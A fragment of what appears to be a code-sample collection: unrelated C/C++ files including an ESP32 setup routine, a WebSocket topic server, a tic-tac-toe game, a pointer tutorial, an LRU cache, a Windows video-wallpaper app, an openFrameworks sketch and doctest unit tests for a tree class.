ESP.restart();\n}\n\nvoid setup() {\n  setupLED();\n  Serial.begin(115200);\n  pinMode(USER_RESET_BTN, INPUT_PULLUP);\n  if (!digitalRead(USER_RESET_BTN)) { // pushbutton on other side of RST is pressed, maybe it is called EN\n    delay(4000);\n    if (!digitalRead(USER_RESET_BTN)) {  // button is still down after 4 secs, a bit hacky ;)\n      resetPreferences();\n    }\n  }\n  \n  lastLightsCheck = millis() - timerDelayLights;  // start immediately\n\n  configService = new ConfigService();\n  if (!configService->begin()) {\n    Serial.println(\"Failed to initialize ConfigService\");\n    return;\n  }\n  Serial.println(\"Started ConfigService\");\n\n  String ssid = configService->loadSSID();\n  String password = configService->loadPassword();\n  String room = configService->loadRoomName();\n\n  Serial.println(\"SSID status=\" + ssid);\n  Serial.println(\"password ",
    "/**\n * @author Alejandro Feo Mart\u00edn, Clemente Feo Gonz\u00e1lez\n * @date July 2, 2024\n * @brief WebSocket server for handling messages and topic subscriptions\n *\n * This program implements a WebSocket server that allows clients to\n * subscribe to topics and send/receive files as messages. It supports configuration\n * via file and command line, and logs activities to a log file or syslog.\n */\n#include <websocketpp/config/asio_no_tls.hpp>\n#include <websocketpp/server.hpp>\n#include <iostream>\n#include <fstream>\n#include <map>\n#include <set>\n#include <vector>\n#include <string>\n#include <syslog.h>\n#include <ctime>\n#include <regex>\n#include <ifaddrs.h>\n#include <arpa/inet.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n\n// Custom configuration for the WebSocket server\nstruct custom_config : public websocketpp::config::asio {\n    typedef custom_config type;\n    typedef websocketpp::config::asio base;\n\n    static const websocketpp::log::level alog_level = websocketpp::log::alevel::none;\n    static const websocketpp::log::level elog_level = websocketpp::log::elevel::none;\n\n    static size_t max_message_size;\n};\n\n// Default maximum message size (200 MB)\nsize_t custom_config::max_message_size = 200 * 1024 * 1024;\n\n// WebSocket server type with custom configuration\ntypedef websocketpp::server<custom_config> server;\n\n// Map of topics and their subscribers\nstd::map<std::string, std::set<websocketpp::connection_hdl, std::owner_less<websocketpp::connection_hdl>>> topics;\n// Map of connections and their associated topics\nstd::map<websocketpp::connection_hdl, std::string, std::owner_less<websocketpp::connection_hdl>> connections;\n// Map of connections and client IP addresses\nstd::map<websocketpp::connection_hdl, std::string, std::owner_less<websocketpp::connection_hdl>> client_ips;\n// Log file path\nstd::string log_file_path;\n\n/**\n * @brief Logs a message to the log file or syslog\n * @param message The message to be logged\n */\nvoid log_message(const std::string& message) {\n    std::time_t now = std::time(nullptr);\n    char timestamp[100];\n    std::strftime(timestamp, sizeof(timestamp), \"%b %d %H:%M:%S\", std::localtime(&now));\n\n    std::string formatted_message = std::string(timestamp) + \" websocket_server: \" + message + \"\\n\";\n\n    if (!log_file_path.empty()) {\n        std::ofstream log_file(log_file_path, std::ios_base::app);\n        if (log_file.is_open()) {\n            log_file << formatted_message;\n            log_file.close();\n        } else {\n            std::cerr << \"Failed to open log file: \" << log_file_path << std::endl;\n        }\n    } else {\n        openlog(\"websocket_server\", LOG_PID | LOG_CONS, LOG_USER);\n        syslog(LOG_INFO, \"%s\", message.c_str());\n        closelog();\n    }\n}\n\n/**\n * @brief Checks if a port is available for use\n * @param port The port number to check\n * @param ip The IP address on which to attempt binding the port\n * @return true if the port is available, false otherwise\n */\nbool is_port_available(int port, const std::string& ip) {\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock == -1) {\n        std::cerr << \"Failed to create socket\" << std::endl;\n        return false;\n    }\n\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(port);\n    addr.sin_addr.s_addr = ip == \"0.0.0.0\" ? INADDR_ANY : inet_addr(ip.c_str());\n\n    int result = bind(sock, (struct sockaddr*)&addr, sizeof(addr));\n    close(sock);\n\n    return result == 0;\n}\n\n\n/**\n * @brief Handles messages received by the WebSocket server\n * @param s Pointer to the WebSocket server\n * @param hdl Connection handler\n * @param msg Pointer to the received message\n */\nvoid on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg) {\n    std::string client_ip = client_ips[hdl];\n    std::string payload = msg->get_payload();\n\n    if (payload.substr(0, 10) == \"subscribe:\") {\n        std::string topic = payload.substr(10);\n        topics[topic].insert(hdl);\n        connections[hdl] = topic;\n        std::cout << \"Client subscribed to topic [\" << topic << \"].\" << std::endl;\n        log_message(\"Client subscribed to topic [\" + topic + \"]\");\n    } else if (payload.substr(0, 8) == \"message:\") {\n        size_t pos = payload.find(':', 8);\n        if (pos != std::string::npos) {\n            std::string topic = payload.substr(8, pos - 8);\n            std::string message = payload.substr(pos + 1);\n\n            // Extraer el tipo MIME y el nombre del archivo\n            size_t mime_pos = message.find(':');\n            size_t file_pos = message.find(':', mime_pos + 1);\n            if (mime_pos != std::string::npos && file_pos != std::string::npos) {\n                std::string mime_type = message.substr(0, mime_pos);\n                std::string file_name = message.substr(mime_pos + 1, file_pos - mime_pos - 1);\n                \n                std::cout << \"Message received from IP [\" << client_ip << \"] on topic [\" << topic << \"]: MIME: \" << mime_type << \"",
    "#include <graphics.h>\n#include <iostream>\n\nstatic const int WINDOW_LENGTH = 1280;\nstatic const int WINDOW_WIDTH = 720;\nstatic const int GRID_NUM = 3;\nstatic const int GRID_WIDTH = WINDOW_WIDTH / GRID_NUM;\nenum class GridStatus {\n\tEmpty,\n\tx,\n\to,\n};\n\nenum class GameStatus {\n\tX_winning,\n\tO_winning,\n\tDraw,\n\tRunning,\n};\n\nvoid draw_grid()\n{\n\tline(0, WINDOW_WIDTH / 3, WINDOW_WIDTH, WINDOW_WIDTH / 3);\n\tline(0, WINDOW_WIDTH * 2 / 3, WINDOW_WIDTH, WINDOW_WIDTH * 2 / 3);\n\tline(WINDOW_WIDTH / 3, 0, WINDOW_WIDTH / 3, WINDOW_WIDTH);\n\tline(WINDOW_WIDTH * 2 / 3, 0, WINDOW_WIDTH * 2 / 3, WINDOW_WIDTH);\n}\nvoid draw_stroke(GridStatus grid[GRID_NUM][GRID_NUM])\n{\n\tfor (size_t i = 0; i < 3; ++i)\n\t{\n\t\tfor (size_t j = 0; j < 3; ++j)\n\t\t{\n\t\t\tswitch (grid[i][j])\n\t\t\t{\n\t\t\tcase GridStatus::x:\n\n\t\t\t\tline(GRID_WIDTH * j, GRID_WIDTH * i, GRID_WIDTH * (j + 1), GRID_WIDTH * (i + 1));\n\t\t\t\tline(GRID_WIDTH * j, GRID_WIDTH * (i + 1), GRID_WIDTH * (j + 1), GRID_WIDTH * i);\n\t\t\t\tbreak;\n\t\t\tcase GridStatus::o:\n\t\t\t\tcircle(GRID_WIDTH / 2 + j * GRID_WIDTH, GRID_WIDTH / 2 + i * GRID_WIDTH, GRID_WIDTH / 2);\n\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n\nGridStatus change_grid(int x,int y,GridStatus& current_stroke,GridStatus TicTacGrid[GRID_NUM][GRID_NUM])\n{\n\n\t\tint col = x / GRID_WIDTH;\n\t\tint row = y / GRID_WIDTH;\n\n\t\tif (col >= 0 && col < GRID_NUM && row >= 0 && row < GRID_NUM)\n\t\t{\n\n\t\t\tif (TicTacGrid[row][col] == GridStatus::Empty)\n\t\t\t{\n\t\t\t\tTicTacGrid[row][col] = current_stroke;\n\t\t\t\treturn (current_stroke == GridStatus::o) ? GridStatus::x : GridStatus::o;\n\t\t\t}\n\t\t}\n\t\treturn current_stroke;\n}\n\n void draw_tip_text(GridStatus current_stroke)\n{\n\t static TCHAR str[64];\n\t _stprintf_s(str, _T(\"\ub3a0\ud488\ud399\u7dbe\uc79a\u8b39:%c\"), (current_stroke==GridStatus::x)?'x':'o');\n\t settextcolor(RGB(225, 175, 45));\n\t outtextxy(1000, 200, str);\n}\n\n GameStatus check_win(GridStatus tictacgrid[GRID_NUM][GRID_NUM])\n{\n\tfor (int i = 0; i < GRID_NUM; ++i)\n\t{\n\t\tif (tictacgrid[i][0] == tictacgrid[i][1] && tictacgrid[i][1] == tictacgrid[i][2])\n\t\t{\n\t\t\tif (tictacgrid[i][0] == GridStatus::x)\n\t\t\t{\n\t\t\t\treturn GameStatus::X_winning;\n\t\t\t}\n\t\t\telse if (tictacgrid[i][0] == GridStatus::o)\n\t\t\t{\n\t\t\t\treturn GameStatus::O_winning;\n\t\t\t}\n\t\t}\n\t\telse if (tictacgrid[0][i] == tictacgrid[1][i] && tictacgrid[1][i] == tictacgrid[2][i])\n\t\t{\n\t\t\tif (tictacgrid[0][i] == GridStatus::x)\n\t\t\t{\n\t\t\t\treturn GameStatus::X_winning;\n\t\t\t}\n\t\t\telse if (tictacgrid[0][i] == GridStatus::o)\n\t\t\t{\n\t\t\t\treturn GameStatus::O_winning;\n\t\t\t}\n\t\t}\n\t}\n\tif (tictacgrid[0][0] == tictacgrid[1][1] && tictacgrid[1][1] == tictacgrid[2][2])\n\t{\n\t\tif (tictacgrid[0][0] == GridStatus::x) {\n\t\t\treturn GameStatus::X_winning;\n\t\t}\n\t\telse if (tictacgrid[0][0] == GridStatus::o)\n\t\t{\n\t\t\treturn GameStatus::O_winning;\n\t\t}\n\t}\n\telse if (tictacgrid[2][0] == tictacgrid[1][1] && tictacgrid[1][1] == tictacgrid[0][2])\n\t{\n\t\tif (tictacgrid[2][0] == GridStatus::x)\n\t\t{\n\t\t\treturn GameStatus::X_winning;\n\t\t}\n\t\telse if (tictacgrid[2][0] == GridStatus::o)\n\t\t{\n\t\t\treturn GameStatus::O_winning;\n\t\t}\n\t}\n\tfor (int i = 0; i < 3; ++i)\n\t{\n\t\tfor (int j = 0; j < 3; ++j)\n\t\t{\n\t\t\tif (tictacgrid[i][j] == GridStatus::Empty)\n\t\t\t{\n\t\t\t\treturn GameStatus::Running;\n\t\t\t}\n\t\t}\n\t}\n\treturn GameStatus::Draw;\n}\n\n\n\nint main()\n{\n\tGridStatus TicTacGrid[GRID_NUM][GRID_NUM];\n\tfor (int i = 0; i < GRID_NUM; ++i)\n\t{\n\t\tfor (int j = 0; j < GRID_NUM; ++j)\n\t\t{\n\t\t\tTicTacGrid[i][j] = GridStatus::Empty;\n\t\t}\n\t}\n\n\tinitgraph(WINDOW_LENGTH, WINDOW_WIDTH);\n\tGameStatus gamestatus = GameStatus::Running;\n\tExMessage msg;\n\tBeginBatchDraw();\n\tGridStatus current_stroke = GridStatus::x;\n\n\twhile (gamestatus == GameStatus::Running)\n\t{\n\t\tDWORD start_time = GetTickCount();\n\t\twhile (peekmessage(&msg))\n\t\t{\n\t\t\tif (msg.message == WM_LBUTTONDOWN)\n\t\t\t{\n\t\t\t\tint x = msg.x;\n\t\t\t\tint y = msg.y;\n\t\t\t\tcurrent_stroke = change_grid(x, y, current_stroke, TicTacGrid);\n\t\t\t}\n\t\t}\n\t\n\t\tgamestatus = check_win(TicTacGrid);\n\t\t \n\t\tcleardevice();\n\t\tdraw_grid();\n\t\tdraw_stroke(TicTacGrid);\n\t\tdraw_tip_text(current_stroke);\n\t\tFlushBatchDraw();\n\t\tDWORD end_time = GetTickCount();\n\t\tDWORD delta_time = end_time - start_time;\n\t\tif (delta_time < 1000 / 60)\n\t\t{\n\t\t\tSleep(1000 / 60 - delta_time);\n\t\t}\n\t}\n\tif (gamestatus == GameStatus::O_winning)\n\t{\n\t\tMessageBox(GetHWnd(), _T(\"O\u9be4\uc18c\uc0bf\u50f9\"), _T(\"\u8e0f\u72d7\uc368\u76e3\"), MB_OK);\n\t}\n\telse if (gamestatus == GameStatus::X_winning)\n\t{\n\t\t\tMessageBox(GetHWnd(), _T(\"X\u9be4\uc18c\uc0bf\u50f9\"), _T(\"\u8e0f\u72d7\uc368\u76e3\"), MB_OK);\n\t}\n\telse if (gamestatus == GameStatus::Draw)\n\t{\n\t\tMessageBox(GetHWnd(), _T(\"\ud2f1\uc560\"), _T(\"\u8e0f\u72d7\uc368\u76e3\"), MB_OK);\n\t}\n\tEndBatchDraw();\n\tclosegraph();\n\treturn 0;\n\t\n}",
    "#include <iostream>\nusing namespace std;\n\nint main(){\n    int a;\n    a = 8;\n    cout<<a<<endl;\n\n    int * p,* l; // \u5b58\u653e\u8a18\u61b6\u9ad4\u4f4d\u7f6e\u7684\u8b8a\u6578 ( * \u4e2d\u9593\u6709\u7a7a\u683c\u662f\u5ba3\u544a)\n    p = &a; // \u5b58\u653e a \u7684\u8a18\u61b6\u9ad4\u4f4d\u7f6e ( p = address)\n    cout<<p<<endl; // p = 0x16bd67288\n\n    *p = 10; // \u900f\u904e\u6307\u6a19\u7ba1\u7406\u8a18\u61b6\u9ad4\uff0c\u52d5\u5230\u6307\u6a19\u88e1\u7684\u8a18\u61b6\u9ad4\u4f4d\u7f6e\u5c0d\u61c9\u7684\u503c (  *p = value   \u53f3\u5074\u7684\u503c\u6307\u6d3e\u7d66 = \u5de6\u5074\u7684\u6307\u6a19\u6240\u7ba1\u7406\u7684\u8a18\u61b6\u9ad4\u7a7a\u9593)\n    cout<< *p <<endl;  // \u8f38\u51fa\u6307\u6a19\u88e1\u7684\u8a18\u61b6\u9ad4\u4f4d\u7f6e\u5c0d\u61c9\u7684\u503c // *p = 10\n\n\n    // \u5ba3\u544a\u6642\u76f4\u63a5\u8ce6\u4e88\u4f4d\u7f6e\n    int * q = &a;\n    *q = 20;\n    cout<<a<<endl; // a = 20\n    cout<<*q<<endl; // *q = 20\n\n\n    // \u914d\u7f6e\u65b0\u7684\u8a18\u61b6\u9ad4\u7a7a\u9593\u7d66pointer\n    int * r;\n    r = new int; // new \u914d\u7f6e\u65b0\u7684\u8a18\u61b6\u9ad4\u7a7a\u9593\n    *r = 100;\n    cout<<r<<endl; // r = 0x14be05e50\n    cout<<*r<<endl; // *r = 100\n \n\n    // \n    int * s = r;\n    *s = 200;\n    cout<<*r<<endl; // *r = 200\n\n\n    // \u7528 new \u914d\u7f6e\u7d66\u6307\u6a19\u7684\u8a18\u61b6\u9ad4\u53ef\u4ee5\u7528delete\u91cb\u653e\n    delete r; // \u91cb\u653e r \u5c0d\u61c9\u7684\u7a7a\u9593\uff0c\u4f46 r \u7684\u6307\u6a19\u503c\u9084\u5b58\u5728\n    cout<<r<<endl;    // r = 0x14be05e50    => \u88e1\u9762\u7684\u6307\u6a19\u503c\u9084\u5728\n    cout<<*r<<endl;   // *r = 0          => \u4f46\u6307\u6a19\u503c\u7684\u7a7a\u9593\u88e1\u7684\u503c\u7121\u6cd5\u5b58\u53d6\u4e86\n\n    r=new int; // \u5982\u679c\u8981\u7528\uff0c\u9808\u91cd\u65b0\u914d\u7f6e\u7a7a\u9593\n    *r = 300;\n\n\n    // const \u6703\u6307\u5b9a\u8b8a\u6578\u7684\u503c\u662f\u5e38\u6578\uff0c\u4e26\u544a\u8a34\u7de8\u8b6f\u5668\u9632\u6b62\u7a0b\u5f0f\u8a2d\u8a08\u4eba\u54e1\u4fee\u6539\u5b83\n    int * const m = new int; // \u53ef\u4ee5\u66f4\u6539\u6578\u503c\uff0c\u7121\u6cd5\u66f4\u6539\u6307\u6a19\n    *m = 100;\n    *m = 200;\n    cout<<*m<<endl;\n    // delete m ;\n    // m = new int; // \u7121\u6cd5\u66f4\u6539 m \u56e0\u70ba m \u8a2d\u7f6e const\n\n    // const int * n = new int; // \u53ef\u4ee5\u66f4\u6539\u6307\u6a19\uff0c\u7121\u6cd5\u66f4\u6539\u6578\u503c\n    // *n = 100; // \u7121\u6cd5\u66f4\u6539 *n \u7684\u6578\u503c\n    const int * n = m;\n    cout<<*n<<endl; \n    n = s;\n    cout<<*n<<endl;\n\n\n    return 0 ;\n}",
    "#include \"LRUCache.h\"\n\n\nLRUCache::LRUCache(int capacity) :\n\t_capacity(capacity)\n{\n\t_mapData.clear();\n\t_listKeyValues.clear();\n}\n\n\nint LRUCache::Get(int key)\n{\n\tunordered_map<int, list<pair<int, int>>::iterator>::iterator itr = _mapData.find(key);\n\tif (itr != _mapData.end())\n\t{\n\t\t// Move to front. \n\t\tlist<pair<int, int>>::iterator target = itr->second;\n\t\t_listKeyValues.erase(target);\n\t\t_listKeyValues.push_front(*target);\n\t\t_mapData[key] = _listKeyValues.begin();\n\n\t\treturn (*target).second;\n\t}\n\treturn -1;\n}\n\nvoid LRUCache::Put(int key, int val)\n{\n\tunordered_map<int, list<pair<int, int>>::iterator>::iterator itr = _mapData.find(key);\n\tif (itr == _mapData.end())\n\t{\n\t\tif (_mapData.size() >= _capacity)\n\t\t{\n\t\t\t// delete the last one. \n\t\t\tlist<pair<int, int>>::iterator toDel = _listKeyValues.end();\n\t\t\t--toDel;\n\t\t\tint keyToDelete = (*toDel).first;\n\t\t\t_listKeyValues.pop_back();\t\t// delete the last data.\n\t\t\t_mapData.erase(keyToDelete);\t// delete it from map.\n\t\t}\n\n\t\t_listKeyValues.push_front(make_pair(key, val));\n\t\t_mapData[key] = _listKeyValues.begin();\n\t}\n\telse\n\t{\n\t\tlist<pair<int, int>>::iterator target = itr->second;\n\t\t_listKeyValues.erase(target);\n\t\t_listKeyValues.push_front(*target);\n\t\t_mapData[key] = _listKeyValues.begin();\n\t}\n}\n",
    "#include <wallpaper-window.h>\n\n#include \"resources.h\"\n#include \"wnd-utils.h\"\n#include \"config.h\"\n#include \"file-utils.h\"\n#include \"string-table.h\"\n\n#define PMID_EXIT 1\n#define PMID_CHANGE 2\n#define PMID_RUN_ON_STARTUP 3\n\n#define REG_RUN_KEY TEXT(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\")\n\nstatic const WCHAR *HWallpaperWindowClassName = TEXT(\"YJL-WALLPAPER\");\n\nextern std::string appPath;\nextern std::wstring exeWPath;\n\nWallpaperWindow *wallpaperWindow;\n\nnamespace hww {\n    DEVMODE dm;\n    HMENU trayMenu;\n    NOTIFYICONDATA nid;\n    HANDLE hMapFile = nullptr;\n\n    LRESULT windowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\n\n    void registerWndClass(HINSTANCE hInstance) {\n        WNDCLASSEX wndClass;\n        wndClass.cbSize = sizeof(wndClass);\n        wndClass.style = CS_HREDRAW | CS_VREDRAW;\n        wndClass.lpfnWndProc = windowProc;\n        wndClass.cbClsExtra = 0;\n        wndClass.cbWndExtra = 0;\n        wndClass.hInstance = hInstance;\n        wndClass.hIcon = ::LoadIcon(GetModuleHandle(nullptr), MAKEINTRESOURCE(IDI_ICON1));\n        wndClass.hCursor = ::LoadCursor(nullptr, IDC_ARROW);\n        wndClass.hbrBackground = (HBRUSH) ::GetStockObject(BLACK_BRUSH);\n        wndClass.lpszMenuName = nullptr;\n        wndClass.lpszClassName = HWallpaperWindowClassName;\n        wndClass.hIconSm = nullptr;\n\n        if (!RegisterClassEx(&wndClass)) {\n            error(\"RegisterClassEx failed\");\n        }\n    }\n\n    HWND pmWindow() {\n        return FindWindow(TEXT(\"Progman\"), TEXT(\"Program Manager\"));\n    }\n\n    HWND splitDesktopWindow() {\n        HWND hWnd = pmWindow();\n        if (hWnd != nullptr) {\n            SendMessage(hWnd, 0x052C, 0, 0);\n        }\n        return hWnd;\n    }\n\n    double toTime(SYSTEMTIME t) {\n        return (t.wHour * 3600 + t.wMinute * 60 + t.wSecond) + t.wMilliseconds / 1000.0;\n    }\n\n    void createMapping() {\n        hMapFile = CreateFileMapping(\n                INVALID_HANDLE_VALUE,\n                nullptr,\n                PAGE_READWRITE,\n                0,\n                sizeof(double),\n                HW_FM_VIDEO);\n        if (hMapFile == nullptr) {\n            error(\"CreateFileMappingW failed\");\n        }\n    }\n\n    /**\n     * \u7ed8\u5236\n     * @param hdc\n     * @return \u662f\u5426\u91cd\u7ed8\n     */\n    bool startPaint(HDC hdc) {\n        // \u6ca1\u6709\u89c6\u9891\uff0c\u7ed8\u5236\u9ed1\u8272\n        if (!wallpaperWindow->decoderAvailable()) {\n            HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));\n            RECT rect = {0};\n            rect.right = wallpaperWindow->GetWidth();\n            rect.bottom = wallpaperWindow->GetHeight();\n            FillRect(hdc, &rect, hBrush);\n            DeleteObject(hBrush);\n            return false;\n        }\n\n        // \u6682\u505c\u4e86\n        if (wallpaperWindow->decoderPaused()) {\n            return false;\n        }\n\n        // \u8fd8\u6ca1\u52a0\u8f7d\u7b2c\u4e00\u5e27\n        if (!wallpaperWindow->firstFrameLoaded()) {\n            return true;\n        }\n\n        SYSTEMTIME now;\n        GetSystemTime(&now);\n        double dt = toTime(now) - wallpaperWindow->lastTime;\n        if (wallpaperWindow->lastTime == 0) {\n            dt = 1.0 / dm.dmDisplayFrequency;\n        }\n        wallpaperWindow->lastTime = toTime(now);\n        wallpaperWindow->nowTime += dt;\n        wallpaperWindow->paint(hdc);\n        return true;\n    }\n\n    bool regHasValue(HKEY hkey, LPCWSTR subKey) {\n        return RegQueryValue(hkey, subKey, nullptr, nullptr) == ERROR_SUCCESS;\n    }\n\n    bool isRunOnStartup() {\n        DWORD size = 260;\n        WCHAR value[260];\n        DWORD err;\n        if ((err = RegGetValue(HKEY_CURRENT_USER, REG_RUN_KEY, APP_NAME,\n                               RRF_RT_REG_SZ, nullptr, value, &size))) {\n            if (err == ERROR_FILE_NOT_FOUND) {\n                return false;\n            }\n            error(\"RegQueryValueEx failed\");\n        }\n        return exeWPath == value;\n    }\n\n    void setRunOnStartup(bool run) {\n        HKEY runKey;\n        if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_KEY, 0, KEY_WRITE, &runKey)) {\n            error(\"RegOpenKeyEx failed\");\n        }\n        if (run) {\n            if (RegSetValueEx(runKey, APP_NAME, 0, REG_SZ,\n                              (BYTE *) exeWPath.c_str(),\n                              static_cast<DWORD>(exeWPath.size() * sizeof(WCHAR)))) {\n                RegCloseKey(runKey);\n                error(\"RegSetValueEx failed\");\n            }\n        } else {\n            if (regHasValue(runKey, APP_NAME)) {\n                if (RegDeleteValue(runKey, APP_NAME)) {\n                    RegCloseKey(runKey);\n                    error(\"RegDeleteValue failed\");\n                }\n            }\n        }\n        RegCloseKey(runKey);\n    }\n\n    void createTray(HWND hWnd) {\n        dm.dmSize = sizeof(DEVMODE);\n        EnumDisplaySettings(nullptr, ENUM_CURRENT_SETTINGS, &dm);\n\n        nid.cbSize = sizeof(nid);\n        nid.hWnd = hWnd;\n        nid.uID = 0;\n        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;\n        nid.uCallbackMessage = WM_USER;\n        nid.hIcon = LoadIcon(GetModuleHandle(nullptr), MAKEINTRESOURCE(I",
    "#include \"ofApp.h\"\t\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(239);\r\n\tofSetLineWidth(2);\r\n\tofSetRectMode(ofRectMode::OF_RECTMODE_CENTER);\r\n\r\n\tthis->font.loadFont(\"fonts/Kazesawa-Bold.ttf\", 50, true, true, true);\r\n\tthis->word = \"01\";\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tofTranslate(ofGetWindowSize() * 0.5);\r\n\r\n\tofSeedRandom(39);\r\n\tfor (int i = 0; i < 36; i++) {\r\n\r\n\t\tauto location = glm::vec3(-25, -250, 0);\r\n\r\n\t\tofPath chara_path = this->font.getCharacterAsPoints(this->word[(int)ofRandom(this->word.size())], true, false);\r\n\t\tvector<ofPolyline> outline = chara_path.getOutline();\r\n\r\n\t\tofFill();\r\n\t\tofSetColor(255);\r\n\t\tofBeginShape();\r\n\t\tfor (int outline_index = 0; outline_index < outline.size(); outline_index++) {\r\n\r\n\t\t\tofNextContour(true);\r\n\r\n\t\t\t//outline[outline_index] = outline[outline_index].getResampledByCount(500);\r\n\t\t\tauto vertices = outline[outline_index].getVertices();\r\n\t\t\tfor (auto& vertex : vertices) {\r\n\r\n\t\t\t\tfloat rotate_deg = i * 10;\r\n\r\n\t\t\t\tglm::vec3 v = location + vertex;\r\n\t\t\t\tauto rotation = glm::rotate(glm::mat4(), rotate_deg * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\t\t\t\tv = glm::vec4(v, 0) * rotation;\r\n\r\n\t\t\t\tint len = glm::length(v);\r\n\t\t\t\tlen = (len / 15) * 15;\r\n\t\t\t\trotate_deg = ofMap(ofNoise(len * 0.0035 - ofGetFrameNum() * 0.02), 0, 1, -90, 90);\r\n\t\t\t\trotation = glm::rotate(glm::mat4(), rotate_deg * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\t\t\t\tv = glm::vec4(v, 0) * rotation;\r\n\r\n\t\t\t\tofVertex(v);\r\n\t\t\t}\r\n\t\t}\r\n\t\tofEndShape(true);\r\n\r\n\t\tofNoFill();\r\n\t\tofSetColor(0);\r\n\t\tofBeginShape();\r\n\t\tfor (int outline_index = 0; outline_index < outline.size(); outline_index++) {\r\n\r\n\t\t\tofNextContour(true);\r\n\r\n\t\t\t//outline[outline_index] = outline[outline_index].getResampledByCount(500);\r\n\t\t\tauto vertices = outline[outline_index].getVertices();\r\n\t\t\tfor (auto& vertex : vertices) {\r\n\r\n\t\t\t\tfloat rotate_deg = i * 10;\r\n\r\n\t\t\t\tglm::vec3 v = location + vertex;\r\n\t\t\t\tauto rotation = glm::rotate(glm::mat4(), rotate_deg * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\t\t\t\tv = glm::vec4(v, 0) * rotation;\r\n\r\n\t\t\t\tint len = glm::length(v);\r\n\t\t\t\tlen = (len / 15) * 15;\r\n\t\t\t\trotate_deg = ofMap(ofNoise(len * 0.0035 - ofGetFrameNum() * 0.02), 0, 1, -90, 90);\r\n\t\t\t\trotation = glm::rotate(glm::mat4(), rotate_deg * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\t\t\t\tv = glm::vec4(v, 0) * rotation;\r\n\r\n\t\t\t\tofVertex(v);\r\n\t\t\t}\r\n\t\t}\r\n\t\tofEndShape(true);\r\n\t}\r\n\r\n\t/*\r\n\tint start = 50;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "//talyape123@gmail.com\n#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN\n#include \"doctest.h\"\n#include \"Tree.hpp\"\n#include \"Node.hpp\"\n\nTEST_CASE(\"Tree Basic Functionality\") {\n    Tree<int, 3> tree;  // Tree with max 3 children per node\n\n    SUBCASE(\"Adding root\") {\n        Node<int> root(1);\n        tree.add_root(&root);\n        CHECK(tree.getRoot()->get_value() == 1);\n    }\n\n    SUBCASE(\"Adding children\") {\n        Node<int> root(1);\n        tree.add_root(&root);\n        Node<int> child1(2);\n        Node<int> child2(3);\n        Node<int> child3(4);\n        tree.add_sub_node(&root, &child1);\n        tree.add_sub_node(&root, &child2);\n        tree.add_sub_node(&root, &child3);\n\n        CHECK(root.get_childrens().size() == 3);\n        CHECK(root.get_childrens()[0]->get_value() == 2);\n        CHECK(root.get_childrens()[1]->get_value() == 3);\n        CHECK(root.get_childrens()[2]->get_value() == 4);\n    }\n\n    SUBCASE(\"Adding too many children\") {\n        Node<int> root(1);\n        tree.add_root(&root);\n\n        Node<int> child1(2);\n        Node<int> child2(3);\n        Node<int> child3(4);\n        Node<int> child4(5);\n\n        tree.add_sub_node(&root, &child1);\n        tree.add_sub_node(&root, &child2);\n        tree.add_sub_node(&root, &child3);\n\n        CHECK_THROWS_AS(tree.add_sub_node(&root, &child4), std::runtime_error);\n    }\n\n    SUBCASE(\"Removing children\") {\n        Node<int> root(1);\n        tree.add_root(&root);\n\n        Node<int> child1(2);\n        Node<int> child2(3);\n\n        tree.add_sub_node(&root, &child1);\n        tree.add_sub_node(&root, &child2);\n\n        CHECK(root.get_childrens().size() == 2);\n\n        root.remove_children();\n\n        CHECK(root.get_childrens().size() == 0);\n    }\n}\n\nTEST_CASE(\"Binary Tree Iterators whith char\") {\n    Tree<char, 2> binary_tree;  // Binary tree with max 2 children per node\n\n    // Add root node\n    Node<char> root('A');\n    binary_tree.add_root(&root);\n\n    // Add nodes\n    Node<char> nodeB('B');\n    Node<char> nodeC('C');\n    Node<char> nodeD('D');\n    Node<char> nodeE('E');\n    Node<char> nodeF('F');\n    Node<char> nodeG('G');\n    Node<char> nodeH('H');\n\n    binary_tree.add_sub_node(&root, &nodeB);\n    binary_tree.add_sub_node(&root, &nodeC);\n    binary_tree.add_sub_node(&nodeB, &nodeD);\n    binary_tree.add_sub_node(&nodeB, &nodeE);\n    binary_tree.add_sub_node(&nodeC, &nodeF);\n    binary_tree.add_sub_node(&nodeC, &nodeG);\n    binary_tree.add_sub_node(&nodeE, &nodeH);\n\n    SUBCASE(\"Pre-Order Iterator\") {\n        std::vector<char> expected = {'A', 'B', 'D', 'E', 'H', 'C', 'F', 'G'};\n        std::vector<char> result;\n\n        for (auto it = binary_tree.begin_pre_order(); it != binary_tree.end_pre_order(); ++it) {\n            result.push_back(*it);\n        }\n\n        CHECK(result == expected);\n    }\n\n    